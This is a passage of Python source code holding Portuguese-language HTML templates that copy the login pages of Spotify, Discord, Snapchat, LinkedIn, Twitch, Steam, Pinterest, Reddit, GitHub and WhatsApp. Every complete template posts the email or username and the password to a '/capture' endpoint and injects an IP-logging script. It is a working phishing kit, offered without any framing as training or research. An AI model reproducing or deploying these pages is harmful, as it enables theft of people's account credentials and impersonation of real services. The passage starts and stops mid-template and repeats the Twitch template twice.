<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Entrar - Spotify</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#121212;font-family:'Inter',Circular,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff;padding:20px}
.card{width:100%;max-width:450px;padding:40px}
.logo{text-align:center;margin-bottom:30px}
.logo svg{width:140px;height:auto;fill:#fff}
hr{border:none;border-top:1px solid #2a2a2a;margin:20px 0}
.inp{width:100%;padding:14px;margin:10px 0;background:#121212;border:1px solid #727272;border-radius:4px;color:#fff;font-size:16px;transition:border-color .2s}
.inp:focus{outline:none;border-color:#fff}
.inp::placeholder{color:#a7a7a7}
.btn{width:100%;padding:14px;margin:15px 0;background:#1db954;color:#000;border:none;border-radius:500px;font-size:16px;font-weight:700;cursor:pointer;transition:transform .1s,background .15s}
.btn:hover{background:#1ed760;transform:scale(1.02)}
.forgot{text-align:center;color:#1db954;font-size:16px;margin:15px 0;cursor:pointer}
.forgot:hover{color:#1ed760}
.signup{text-align:center;color:#a7a7a7;font-size:16px;margin-top:20px}
.signup a{color:#fff;text-decoration:none;font-weight:600}
.signup a:hover{text-decoration:underline}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 168 50" xmlns="http://www.w3.org/2000/svg"><path d="M25 0C11.2 0 0 11.2 0 25s11.2 25 25 25 25-11.2 25-25S38.8 0 25 0zm11.5 36c-.4.7-1.3.9-2 .5-5.5-3.4-12.4-4.1-20.6-2.3-.8.2-1.6-.3-1.8-1.1-.2-.8.3-1.6 1.1-1.8 8.9-2 16.4-1.2 22.6 2.5.7.4.9 1.3.5 2zm3.1-6.8c-.5.8-1.6 1.1-2.4.5-6.3-3.9-15.9-5-23.3-2.7-1 .3-2-.3-2.3-1.2-.3-1 .3-2 1.2-2.3 8.4-2.6 18.9-1.3 26.1 3.2.8.5 1.1 1.5.5 2.4zm.3-7.1c-7.6-4.5-20.1-4.9-27.4-2.7-1.2.4-2.4-.3-2.8-1.5-.4-1.2.3-2.4 1.5-2.8 8.3-2.5 22.1-2 30.7 3.1 1.1.6 1.4 2 .8 3.1-.6 1-2 1.4-3.1.8zM83.8 19.3c-4.6-1.1-5.4-1.9-5.4-3.5 0-1.5 1.4-2.6 3.6-2.6 2.1 0 4.1.8 6.3 2.5.1.1.2.1.3.1.1 0 .2 0 .3-.1l2.3-3.2c.2-.2.1-.5-.1-.7-2.6-2.2-5.6-3.2-9.1-3.2-5.1 0-8.7 3.1-8.7 7.4 0 4.7 3.1 6.4 8.4 7.7 4.4 1.1 5.1 2 5.1 3.4 0 1.7-1.5 2.7-3.9 2.7-2.7 0-5-.9-7.5-3.1-.1-.1-.2-.1-.3-.1-.1 0-.2 0-.3.1l-2.5 3.1c-.1.2 0 .5.2.6 2.9 2.6 6.5 4 10.3 4 5.5 0 9.1-3 9.1-7.6-.1-4-2.4-6.1-8.2-7.7zm18.5-3.5c-2.3 0-4.2.9-5.7 2.7V16c0-.3-.2-.5-.5-.5h-4.2c-.3 0-.5.2-.5.5v21.4c0 .3.2.5.5.5h4.2c.3 0 .5-.2.5-.5v-6.7c1.5 1.7 3.4 2.6 5.7 2.6 4.2 0 8.5-3.3 8.5-9.1 0-5.8-4.3-9.1-8.5-9.1zm3.3 9.1c0 2.9-1.8 5-4.3 5-2.4 0-4.4-2.1-4.4-5s2-5 4.4-5c2.5 0 4.3 2.1 4.3 5zm16.5-9.1c-5.3 0-9.5 4-9.5 9.1 0 5.1 4.1 9.1 9.4 9.1 5.3 0 9.5-4 9.5-9.1 0-5.1-4.1-9.1-9.4-9.1zm0 13.6c-2.5 0-4.4-2.1-4.4-4.5 0-2.5 1.9-4.5 4.3-4.5 2.5 0 4.4 2.1 4.4 4.5 0 2.5-1.8 4.5-4.3 4.5zm20.2-13.1h-4.6V11c0-.3-.2-.5-.5-.5h-4.2c-.3 0-.5.2-.5.5v4.3h-2c-.3 0-.5.2-.5.5v3.6c0 .3.2.5.5.5h2v9.3c0 3.7 1.8 5.5 5.6 5.5 1.5 0 2.8-.3 4-1 .2-.1.3-.4.2-.6l-1.4-3.3c-.1-.2-.3-.3-.5-.2-.6.3-1.2.5-1.9.5-1 0-1.5-.5-1.5-1.5v-8.7h4.6c.3 0 .5-.2.5-.5v-3.6c.1-.3-.1-.5-.4-.5zm14.7.1v-.6c0-1.8.7-2.6 2.3-2.6.9 0 1.6.2 2.3.4.2.1.5 0 .5-.2l1.3-3.5c.1-.2 0-.5-.3-.6-1-.4-2.3-.7-4-.7-4.4 0-6.7 2.5-6.7 7.2v.5h-2c-.3 0-.5.2-.5.5v3.7c0 .3.2.5.5.5h2v13.3c0 .3.2.5.5.5h4.2c.3 0 .5-.2.5-.5V19.7h3.9l6 13.3c-.7 1.5-1.4 1.8-2.3 1.8-.8 0-1.6-.2-2.4-.7-.2-.1-.5 0-.6.2l-1.4 3.1c-.1.2 0 .5.2.6 1.3.8 2.7 1.1 4.3 1.1 3 0 4.6-1.4 6.1-5.2l7.1-17.8c.1-.2 0-.4-.2-.5-.1-.1-.2-.1-.3-.1h-4.4c-.2 0-.4.2-.5.4l-4.3 11.8-4.7-11.8c-.1-.2-.3-.4-.5-.4h-7.2z"/></svg></div>
<hr>
<form action="/capture" method="POST">
<input type="email" name="email" class="inp" placeholder="Email ou nome de usuario" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<button type="submit" class="btn">Entrar</button>
</form>
<div class="forgot">Esqueceu sua senha?</div>
<hr>
<div class="signup">Nao tem uma conta? <a href="#">Inscrever-se no Spotify</a></div>
</div></body></html>"""


DISCORD_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#36393f;font-family:'Inter','Whitney','Helvetica Neue',Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{width:100%;max-width:480px;background:#36393f;border-radius:5px;padding:32px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
h2{color:#fff;font-size:24px;font-weight:700;text-align:center;margin-bottom:8px}
.sub{color:#b9bbbe;font-size:16px;text-align:center;margin-bottom:20px}
.label{color:#b9bbbe;font-size:12px;font-weight:700;text-transform:uppercase;margin-bottom:8px;display:block}
.inp{width:100%;padding:10px;height:40px;background:#202225;border:1px solid #040405;border-radius:3px;color:#dcddde;font-size:16px;transition:border-color .2s}
.inp:focus{outline:none;border-color:#5865f2}
.inp::placeholder{color:#72767d}
.forgot{color:#00aff4;font-size:14px;margin:4px 0 20px;display:inline-block;cursor:pointer}
.forgot:hover{text-decoration:underline}
.btn{width:100%;padding:12px;background:#5865f2;color:#fff;border:none;border-radius:3px;font-size:16px;font-weight:500;cursor:pointer;transition:background .15s}
.btn:hover{background:#4752c4}
.need{color:#72767d;font-size:14px;margin-top:8px}
.need a{color:#00aff4;text-decoration:none}
.need a:hover{text-decoration:underline}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<h2>Bem-vindo de volta!</h2>
<p class="sub">Estamos muito animados em te ver novamente!</p>
<form action="/capture" method="POST">
<label class="label">E-mail ou numero de telefone</label>
<input type="text" name="email" class="inp" required>
<label class="label" style="margin-top:16px">Senha</label>
<input type="password" name="password" class="inp" required>
<div class="forgot">Esqueceu sua senha?</div>
<button type="submit" class="btn">Entrar</button>
</form>
<p class="need">Precisando de uma conta? <a href="#">Registre-se</a></p>
</div></body></html>"""


SNAPCHAT_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Snapchat</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fffc00;font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{width:100%;max-width:360px;background:#fff;border-radius:20px;padding:40px 32px;box-shadow:0 8px 32px rgba(0,0,0,0.15)}
.logo{text-align:center;margin-bottom:32px}
.logo svg{width:60px;height:60px}
h1{font-size:1.5rem;font-weight:700;text-align:center;color:#16191c;margin-bottom:24px}
.inp{width:100%;padding:14px 16px;margin:8px 0;border:1px solid #e5e5e5;border-radius:8px;font-size:16px;transition:border-color .2s,box-shadow .2s}
.inp:focus{outline:none;border-color:#0fadff;box-shadow:0 0 0 3px rgba(15,173,255,0.1)}
.inp::placeholder{color:#8e8e93}
.btn{width:100%;padding:14px;margin:16px 0;background:#0fadff;color:#fff;border:none;border-radius:24px;font-size:16px;font-weight:700;cursor:pointer;transition:background .15s}
.btn:hover{background:#0a8ecc}
.forgot{text-align:center;color:#0fadff;font-size:14px;margin:12px 0;cursor:pointer}
.forgot:hover{text-decoration:underline}
.or{display:flex;align-items:center;margin:20px 0;color:#8e8e93;font-size:14px}
.or::before,.or::after{content:'';flex:1;height:1px;background:#e5e5e5;margin:0 12px}
.signup{text-align:center;color:#8e8e93;font-size:14px;margin-top:16px}
.signup a{color:#0fadff;text-decoration:none;font-weight:600}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg"><circle cx="30" cy="30" r="28" fill="#fffc00"/><path d="M30 15c-5 0-9 4-9 9v6c0 5 4 9 9 9s9-4 9-9v-6c0-5-4-9-9-9zm0 20c-2.8 0-5-2.2-5-5v-6c0-2.8 2.2-5 5-5s5 2.2 5 5v6c0 2.8-2.2 5-5 5z" fill="#fff"/></svg></div>
<h1>Entrar no Snapchat</h1>
<form action="/capture" method="POST">
<input type="text" name="username" class="inp" placeholder="Nome de usuario ou email" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<button type="submit" class="btn">Entrar</button>
</form>
<div class="forgot">Esqueceu sua senha?</div>
<div class="or">ou</div>
<div class="signup">Novo no Snapchat? <a href="#">Cadastre-se</a></div>
</div></body></html>"""


LINKEDIN_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Entrar no LinkedIn</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f3f2f0;font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{width:100%;max-width:400px;padding:40px}
.logo{text-align:center;margin-bottom:24px}
.logo svg{width:135px;height:34px;fill:#0a66c2}
h1{font-size:2rem;font-weight:600;color:#000;margin-bottom:8px}
.sub{color:#000;font-size:.9rem;margin-bottom:24px}
.inp{width:100%;padding:14px 16px;margin:8px 0;border:1px solid #000;border-radius:4px;font-size:1rem;transition:box-shadow .2s}
.inp:focus{outline:none;box-shadow:0 0 0 1px #000}
.inp::placeholder{color:#666}
.btn{width:100%;padding:14px;margin:16px 0;background:#0a66c2;color:#fff;border:none;border-radius:28px;font-size:1rem;font-weight:600;cursor:pointer;transition:background .15s}
.btn:hover{background:#004182}
.forgot{text-align:center;color:#0a66c2;font-size:.9rem;margin:12px 0;cursor:pointer}
.forgot:hover{text-decoration:underline}
.or{display:flex;align-items:center;margin:20px 0;color:#666;font-size:.9rem}
.or::before,.or::after{content:'';flex:1;height:1px;background:#ccc;margin:0 12px}
.google-btn{width:100%;padding:12px;background:#fff;color:#3c4043;border:1px solid #747775;border-radius:4px;font-size:.9rem;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:box-shadow .2s}
.google-btn:hover{box-shadow:0 1px 2px 0 rgba(60,64,67,0.3),0 1px 3px 1px rgba(60,64,67,0.15)}
.signup{text-align:center;color:#000;font-size:1rem;margin-top:24px}
.signup a{color:#0a66c2;text-decoration:none;font-weight:600}
.signup a:hover{text-decoration:underline}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 135 34" xmlns="http://www.w3.org/2000/svg"><path d="M25.8 0H2.2C1 0 0 1 0 2.2v29.6C0 33 1 34 2.2 34h23.6c1.2 0 2.2-1 2.2-2.2V2.2C28 1 27 0 25.8 0zM8.4 28.9H4.2V12.7h4.2v16.2zM6.3 10.8c-1.3 0-2.4-1.1-2.4-2.4s1.1-2.4 2.4-2.4 2.4 1.1 2.4 2.4-1.1 2.4-2.4 2.4zm22.6 18.1h-4.2v-7.9c0-1.9 0-4.3-2.6-4.3s-3 2-3 4.1v8.1h-4.2V12.7h4v2.2h.1c.6-1.1 2-2.2 4-2.2 4.3 0 5.1 2.8 5.1 6.5v9.7z"/></svg></div>
<h1>Entrar</h1>
<p class="sub">Acompanhe as novidades do seu mundo profissional</p>
<form action="/capture" method="POST">
<input type="email" name="email" class="inp" placeholder="Email ou telefone" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<button type="submit" class="btn">Entrar</button>
</form>
<div class="forgot">Esqueceu a senha?</div>
<div class="or">ou</div>
<button class="google-btn">Entrar com o Google</button>
<div class="signup">Novo no LinkedIn? <a href="#">Cadastre-se</a></div>
</div></body></html>"""


TWITCH_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Twitch</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0e0e10;font-family:'Inter','Roobert',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#efeff1;padding:20px}
.card{width:100%;max-width:400px;padding:40px}
.logo{text-align:center;margin-bottom:32px}
.logo svg{width:60px;height:60px;fill:#a970ff}
h1{font-size:1.5rem;font-weight:600;text-align:center;margin-bottom:8px}
.sub{color:#adadb8;font-size:.9rem;text-align:center;margin-bottom:24px}
.inp{width:100%;padding:12px 16px;margin:8px 0;background:#18181b;border:1px solid #53535f;border-radius:4px;color:#efeff1;font-size:1rem;transition:border-color .2s,box-shadow .2s}
.inp:focus{outline:none;border-color:#a970ff;box-shadow:0 0 0 2px rgba(169,112,255,0.2)}
.inp::placeholder{color:#adadb8}
.btn{width:100%;padding:12px;margin:16px 0;background:#a970ff;color:#000;border:none;border-radius:4px;font-size:1rem;font-weight:600;cursor:pointer;transition:background .15s}
.btn:hover{background:#bf94ff}
.forgot{text-align:center;color:#a970ff;font-size:.9rem;margin:12px 0;cursor:pointer}
.forgot:hover{text-decoration:underline}
.signup{text-align:center;color:#adadb8;font-size:.9rem;margin-top:24px}
.signup a{color:#a970ff;text-decoration:none;font-weight:600}
.signup a:hover{text-decoration:underline}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg"><path d="M10 5L5 15v35h15l5 5h5l5-5h10V5H10zm35 40H35l-5 5h-5l-5-5H15V15h30v30z"/><path d="M30 25h5v10h-5zM40 25h5v10h-5z"/></svg></div>
<h1>Entrar na Twitch</h1>
<p class="sub">Conecte-se com sua comunidade</p>
<form action="/capture" method="POST">
<input type="text" name="username" class="inp" placeholder="Nome de usuario" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<button type="submit" class="btn">Entrar</button>
</form>
<div class="forgot">Problemas para acessar?</div>
<div class="signup">Novo na Twitch? <a href="#">Cadastre-se</a></div>
</div></body></html>"""


TWITCH_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Twitch</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0e0e10;font-family:'Inter','Roobert',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#efeff1;padding:20px}
.card{width:100%;max-width:400px;padding:40px}
.logo{text-align:center;margin-bottom:32px}
.logo svg{width:60px;height:60px;fill:#a970ff}
h1{font-size:1.5rem;font-weight:600;text-align:center;margin-bottom:8px}
.sub{color:#adadb8;font-size:.9rem;text-align:center;margin-bottom:24px}
.inp{width:100%;padding:12px 16px;margin:8px 0;background:#18181b;border:1px solid #53535f;border-radius:4px;color:#efeff1;font-size:1rem;transition:border-color .2s,box-shadow .2s}
.inp:focus{outline:none;border-color:#a970ff;box-shadow:0 0 0 2px rgba(169,112,255,0.2)}
.inp::placeholder{color:#adadb8}
.btn{width:100%;padding:12px;margin:16px 0;background:#a970ff;color:#000;border:none;border-radius:4px;font-size:1rem;font-weight:600;cursor:pointer;transition:background .15s}
.btn:hover{background:#bf94ff}
.forgot{text-align:center;color:#a970ff;font-size:.9rem;margin:12px 0;cursor:pointer}
.forgot:hover{text-decoration:underline}
.signup{text-align:center;color:#adadb8;font-size:.9rem;margin-top:24px}
.signup a{color:#a970ff;text-decoration:none;font-weight:600}
.signup a:hover{text-decoration:underline}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg"><path d="M10 5L5 15v35h15l5 5h5l5-5h10V5H10zm35 40H35l-5 5h-5l-5-5H15V15h30v30z"/><path d="M30 25h5v10h-5zM40 25h5v10h-5z"/></svg></div>
<h1>Entrar na Twitch</h1>
<p class="sub">Conecte-se com sua comunidade</p>
<form action="/capture" method="POST">
<input type="text" name="username" class="inp" placeholder="Nome de usuario" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<button type="submit" class="btn">Entrar</button>
</form>
<div class="forgot">Problemas para acessar?</div>
<div class="signup">Novo na Twitch? <a href="#">Cadastre-se</a></div>
</div></body></html>"""


STEAM_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Steam</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#171a21;font-family:'Inter',Arial,Helvetica,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#c7d5e0;padding:20px}
.card{width:100%;max-width:400px;padding:40px}
.logo{text-align:center;margin-bottom:32px}
.logo h1{font-size:2.5rem;font-weight:700;color:#fff;letter-spacing:2px}
h1{font-size:1.8rem;font-weight:700;text-align:center;color:#fff;margin-bottom:8px}
.sub{color:#8f98a0;font-size:.9rem;text-align:center;margin-bottom:24px}
.inp{width:100%;padding:12px 16px;margin:8px 0;background:#32353c;border:1px solid #3d4450;border-radius:2px;color:#fff;font-size:1rem;transition:border-color .2s}
.inp:focus{outline:none;border-color:#66c0f4}
.inp::placeholder{color:#8f98a0}
.btn{width:100%;padding:12px;margin:16px 0;background:linear-gradient(90deg,#47bfff 0%,#1a44c2 100%);color:#fff;border:none;border-radius:2px;font-size:1rem;font-weight:500;cursor:pointer;transition:filter .15s}
.btn:hover{filter:brightness(1.2)}
.forgot{text-align:center;color:#66c0f4;font-size:.9rem;margin:12px 0;cursor:pointer}
.forgot:hover{text-decoration:underline}
.signup{text-align:center;color:#8f98a0;font-size:.9rem;margin-top:24px}
.signup a{color:#66c0f4;text-decoration:none;font-weight:500}
.signup a:hover{text-decoration:underline}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><h1>STEAM</h1></div>
<h1>Entrar</h1>
<p class="sub">Com sua conta Steam</p>
<form action="/capture" method="POST">
<input type="text" name="username" class="inp" placeholder="Nome de conta Steam" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<button type="submit" class="btn">Entrar</button>
</form>
<div class="forgot">Esqueceu sua senha?</div>
<div class="signup">Novo na Steam? <a href="#">Criar uma conta</a></div>
</div></body></html>"""


PINTEREST_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pinterest</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{width:100%;max-width:400px;padding:40px;text-align:center}
.logo{margin-bottom:24px}
.logo svg{width:40px;height:40px;fill:#e60023}
h1{font-size:2rem;font-weight:700;color:#111;margin-bottom:8px}
.sub{color:#111;font-size:1rem;margin-bottom:32px}
.inp{width:100%;padding:14px 16px;margin:8px 0;border:2px solid #ddd;border-radius:16px;font-size:1rem;transition:border-color .2s,box-shadow .2s}
.inp:focus{outline:none;border-color:#e60023;box-shadow:0 0 0 3px rgba(230,0,35,0.1)}
.inp::placeholder{color:#767676}
.btn{width:100%;padding:14px;margin:16px 0;background:#e60023;color:#fff;border:none;border-radius:24px;font-size:1rem;font-weight:700;cursor:pointer;transition:background .15s}
.btn:hover{background:#ad081b}
.forgot{color:#111;font-size:.9rem;margin:12px 0;cursor:pointer}
.forgot:hover{text-decoration:underline}
.or{display:flex;align-items:center;margin:20px 0;color:#767676;font-size:.9rem}
.or::before,.or::after{content:'';flex:1;height:1px;background:#ddd;margin:0 12px}
.fb-btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:24px;font-size:1rem;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
.signup{color:#111;font-size:.9rem;margin-top:24px}
.signup a{color:#e60023;text-decoration:none;font-weight:600}
.signup a:hover{text-decoration:underline}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 2.04c-5.5 0-10 4.49-10 10.02 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.52 1.5-3.9 3.78-3.9 1.1 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.77-1.63 1.56v1.87h2.78l-.45 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.53-4.5-10.02-10-10.02z"/></svg></div>
<h1>Bem-vindo ao Pinterest</h1>
<p class="sub">Encontre novas ideias para experimentar</p>
<form action="/capture" method="POST">
<input type="email" name="email" class="inp" placeholder="Email" required>
<input type="password" name="password" class="inp" placeholder="Criar uma senha" required>
<button type="submit" class="btn">Continuar</button>
</form>
<div class="forgot">Esqueceu sua senha?</div>
<div class="or">ou</div>
<button class="fb-btn">Continuar com o Facebook</button>
<div class="signup">Ja e membro? <a href="#">Entrar</a></div>
</div></body></html>"""


REDDIT_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Reddit</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f1419;font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#d7dadc;padding:20px}
.card{width:100%;max-width:400px;padding:40px}
.logo{text-align:center;margin-bottom:32px}
.logo svg{width:60px;height:60px;fill:#ff4500}
h1{font-size:1.5rem;font-weight:700;text-align:center;margin-bottom:8px}
.sub{color:#818384;font-size:.9rem;text-align:center;margin-bottom:24px}
.inp{width:100%;padding:12px 16px;margin:8px 0;background:#1a1a1b;border:1px solid #343536;border-radius:4px;color:#d7dadc;font-size:1rem;transition:border-color .2s,box-shadow .2s}
.inp:focus{outline:none;border-color:#ff4500;box-shadow:0 0 0 2px rgba(255,69,0,0.2)}
.inp::placeholder{color:#818384}
.btn{width:100%;padding:12px;margin:16px 0;background:#ff4500;color:#fff;border:none;border-radius:9999px;font-size:1rem;font-weight:700;cursor:pointer;transition:background .15s}
.btn:hover{background:#e03d00}
.forgot{text-align:center;color:#ff4500;font-size:.9rem;margin:12px 0;cursor:pointer}
.forgot:hover{text-decoration:underline}
.signup{text-align:center;color:#818384;font-size:.9rem;margin-top:24px}
.signup a{color:#ff4500;text-decoration:none;font-weight:600}
.signup a:hover{text-decoration:underline}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg"><circle cx="30" cy="30" r="28" fill="#ff4500"/><path d="M30 15c-5 0-9 4-9 9v6c0 5 4 9 9 9s9-4 9-9v-6c0-5-4-9-9-9zm0 20c-2.8 0-5-2.2-5-5v-6c0-2.8 2.2-5 5-5s5 2.2 5 5v6c0 2.8-2.2 5-5 5z" fill="#fff"/></svg></div>
<h1>Entrar no Reddit</h1>
<p class="sub">A comunidade mais grande da internet</p>
<form action="/capture" method="POST">
<input type="text" name="username" class="inp" placeholder="Nome de usuario ou email" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<button type="submit" class="btn">Entrar</button>
</form>
<div class="forgot">Esqueceu sua senha?</div>
<div class="signup">Novo no Reddit? <a href="#">Cadastre-se</a></div>
</div></body></html>"""


GITHUB_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Entrar no GitHub</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#c9d1d9;padding:20px}
.card{width:100%;max-width:340px;padding:40px}
.logo{text-align:center;margin-bottom:24px}
.logo svg{width:48px;height:48px;fill:#f0f6fc}
h1{font-size:1.5rem;font-weight:300;text-align:center;color:#f0f6fc;margin-bottom:16px}
.label{color:#8b949e;font-size:.9rem;margin-bottom:8px;display:block}
.inp{width:100%;padding:8px 12px;margin:8px 0;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:1rem;transition:border-color .2s,box-shadow .2s}
.inp:focus{outline:none;border-color:#58a6ff;box-shadow:0 0 0 3px rgba(88,166,255,0.1)}
.inp::placeholder{color:#6e7681}
.btn{width:100%;padding:8px 16px;margin:16px 0;background:#238636;color:#fff;border:1px solid rgba(240,246,252,0.1);border-radius:6px;font-size:1rem;font-weight:500;cursor:pointer;transition:background .15s}
.btn:hover{background:#2ea043}
.forgot{text-align:center;color:#58a6ff;font-size:.9rem;margin:12px 0;cursor:pointer}
.forgot:hover{text-decoration:underline}
.signup{text-align:center;color:#8b949e;font-size:.9rem;margin-top:24px;padding-top:24px;border-top:1px solid #30363d}
.signup a{color:#58a6ff;text-decoration:none;font-weight:500}
.signup a:hover{text-decoration:underline}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path d="M24 0C10.7 0 0 10.7 0 24c0 10.6 6.9 19.6 16.4 22.8 1.2.2 1.6-.5 1.6-1.2v-4.2c-6.7 1.5-8.1-3.2-8.1-3.2-1.1-2.8-2.7-3.5-2.7-3.5-2.2-1.5.2-1.5.2-1.5 2.4.2 3.7 2.5 3.7 2.5 2.1 3.7 5.6 2.6 7 2 .2-1.6.8-2.6 1.5-3.2-5.3-.6-10.9-2.7-10.9-11.9 0-2.6.9-4.8 2.5-6.5-.2-.6-1.1-3.1.2-6.4 0 0 2-.6 6.5 2.5 1.9-.5 3.9-.8 6-.8s4.1.3 6 .8c4.5-3.1 6.5-2.5 6.5-2.5 1.3 3.3.5 5.8.2 6.4 1.5 1.7 2.5 3.9 2.5 6.5 0 9.2-5.6 11.2-10.9 11.8.9.7 1.6 2.2 1.6 4.4v6.5c0 .6.4 1.4 1.6 1.2C41.1 43.6 48 34.6 48 24c0-13.3-10.7-24-24-24z"/></svg></div>
<h1>Entrar no GitHub</h1>
<form action="/capture" method="POST">
<label class="label">Nome de usuario ou endereco de email</label>
<input type="text" name="username" class="inp" required>
<label class="label" style="margin-top:16px">Senha</label>
<input type="password" name="password" class="inp" required>
<button type="submit" class="btn">Entrar</button>
</form>
<div class="forgot">Esqueceu sua senha?</div>
<div class="signup">Novo no GitHub? <a href="#">Criar uma conta</a></div>
</div></body></html>"""


WHATSAPP_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WhatsApp Web</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{width:100%;max-width:400px;background:#fff;border-radius:8px;padding:40px;box-shadow:0 2px 8px rgba(0,0,0,0.1);text-align:center}
.logo{margin-bottom:24px}
.logo svg{width:64px;height:64px}
h1{font-size:1.5rem;font-weight:700;color:#111b21;margin-bottom:8px}
